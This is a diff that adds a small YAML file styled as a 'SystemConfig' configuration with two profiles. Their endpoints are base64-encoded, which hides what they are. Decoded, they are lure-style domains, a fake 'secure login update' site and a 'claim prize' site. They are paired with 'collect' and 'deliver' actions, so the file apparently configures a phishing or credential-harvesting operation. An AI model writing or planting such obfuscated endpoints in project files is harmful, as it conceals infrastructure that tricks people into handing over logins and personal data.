@@ -1,0 +1,19 @@
+system:
+  agent: "SystemConfig"
+  mode: 2
+  locale: "AR"
+
+profiles:
+  - id: "p_001"
+    desc: "security_check"
+    endpoint: "aHR0cDovL3NlY3VyZS1sb2dpbi11cGRhdGUuY29t"
+    action: "collect"
+
+  - id: "p_002"
+    desc: "reward_center"
+    endpoint: "aHR0cDovL2NsYWltLXByaXplLW5vdy5uZXQ="
+    action: "deliver"
+
+logging:
+  enabled: true
+  level: 20
